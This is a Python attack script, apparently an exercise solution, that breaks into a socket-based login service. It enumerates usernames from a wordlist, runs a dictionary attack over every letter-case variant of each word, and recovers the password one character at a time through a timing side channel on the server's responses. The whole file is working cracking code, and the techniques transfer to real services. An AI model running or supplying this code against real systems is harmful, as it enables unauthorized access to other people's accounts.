import argparse
import socket
import time
from itertools import product
from string import ascii_lowercase, ascii_uppercase, digits
import os
import json

char_str_lower_digits = ascii_lowercase + digits
file_path = os.path.join(os.path.dirname(__file__), "../passwords.txt")
login_file_path = os.path.join(os.path.dirname(__file__), "../logins.txt")
char_str_lower_upper_digits = ascii_lowercase + ascii_uppercase + digits


class MySocket:
    def __init__(self, host, port):
        self.socket = socket.socket()
        self.connect((host, port))

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close_connection()

    def connect(self, address):
        self.socket.connect(address)

    def close_connection(self):
        self.socket.close()

    def try_password(self, password):
        buffer_size = 1024
        self.socket.send(password.encode())
        response = self.socket.recv(buffer_size).decode()
        if response == "Connection success!":
            print(password)
            return True
        elif response == "Too many attempts":
            print(response)
            return False
        else:
            return False

    def json_get_login(self, login_string):
        buffer_size = 1024
        json_dict = {"login": login_string, "password": ""}
        json_str = json.dumps(json_dict)
        self.socket.send(json_str.encode())
        response = self.socket.recv(buffer_size).decode()
        json_dict_response = json.loads(response)
        successful_login_dict = {"result": "Wrong password!"}
        if json_dict_response == successful_login_dict:
            return login_string
        else:
            return False

    def json_try_password_char(self, login, chars):
        buffer_size = 1024
        json_dict = {"login": login, "password": chars}
        json_str = json.dumps(json_dict)
        start = time.perf_counter()
        self.socket.send(json_str.encode())
        response = self.socket.recv(buffer_size)
        stop = time.perf_counter()
        retrieve_time = stop - start
        # print(f"The retrieve time is {retrieve_time}")
        json_dict_response = json.loads(response)
        json_dict_exception = {"result": "Exception happened during login"}
        json_dict_success = {"result": "Connection success!"}
        if retrieve_time > 7e-4:
            return chars
        elif json_dict_response == json_dict_success:
            # print("Found correct login!")
            json_dict_login_password = {"login": login, "password": chars}
            print(json.dumps(json_dict_login_password, indent=4))
            return json_dict_success
        else:
            return False


def parse_args():
    parser = argparse.ArgumentParser(description="Connect to remote server socket with password")
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    return parser.parse_args()


def generate_password():
    for counter in range(1, len(char_str_lower_digits) + 1):
        for p in product(char_str_lower_digits, repeat=counter):
            yield "".join(map(lambda x: str(x), p))


def generate_possible_passwords_from_word(word):
    return map(lambda x: "".join(x), product(*([letter.lower(), letter.upper()] for letter in word.strip())))


def get_word_list_from_path(path):
    with open(path, "r", encoding="utf-8") as f:
        return f.readlines()


def get_login_list_from_path(path):
    login_list = []
    stripped_login_list = []
    with open(path) as file:
        login_list = file.readlines()
        for login in login_list:
            stripped_login_list.append(login.replace("\n", ""))
    return stripped_login_list


def generate_char_from_list(chars):
    for char in chars:
        yield char


def connect():
    args = parse_args()
    with MySocket(args.host, args.port) as sock:
        word_list = get_word_list_from_path(file_path)
        for password in word_list:
            passwords = generate_possible_passwords_from_word(password)
            for password_variant in passwords:
                password_success = sock.try_password(password_variant)
                if password_success:
                    return


def json_connect(debug=False):
    args = parse_args()
    if debug:
        print("args parsed")
    with MySocket(args.host, args.port) as sock:
        if debug:
            print("Sock created")
        successful_login_str = ""
        if debug:
            print("Created empty successful login string")
        password_chars = ""
        if debug:
            print("Created empty successful password sequence")
        successful_connection = {"result": "Connection success!"}
        if debug:
            print("Created 'successful connection string:", successful_connection)
        login_list = get_login_list_from_path(login_file_path)
        if debug:
            print("Created 'login list':", login_list)
        for login in login_list:
            if debug:
                print(f"Sending login: {login} through sock")
            result = sock.json_get_login(login)
            if result:
                if debug:
                    print("Found correct login:", login)
                successful_login_str = result
                break
        char_generator = (generate_char_from_list(char_str_lower_upper_digits))
        if debug:
            print("Created generator from char_str_lower_upper_digits:", char_str_lower_upper_digits)
        continue_loop = True
        if debug:
            print("Set 'continue_loop' to True")
        counter = 0
        while continue_loop:
            if debug:
                print(f"The value of the counter is {counter}")
            if debug:
                print("Entering 'while continue_loop' loop")
            for char in char_generator:
                if debug:
                    print("Generated char:", char)
                    print(f"Sending args login and password through socket: {successful_login_str}"
                          f" : {password_chars + char}")
                result = sock.json_try_password_char(successful_login_str, password_chars + char)
                if result == successful_connection:
                    continue_loop = False
                    break
                elif result == password_chars + char:
                    if debug:
                        print("Found correct char in password:", char)
                    password_chars += char
                    if debug:
                        print(f"Appending char: {char} to password_chars: {password_chars}")
                    char_generator = (generate_char_from_list(char_str_lower_upper_digits))
                    if debug:
                        print("Resetting char_generator")
                    break
            if counter > 10:
                continue_loop = False
            counter += 1
            if debug:
                print("Incrementing counter by 1")
            char_generator = (generate_char_from_list(char_str_lower_upper_digits))
            if debug:
                print("Resetting char_generator")


json_connect()
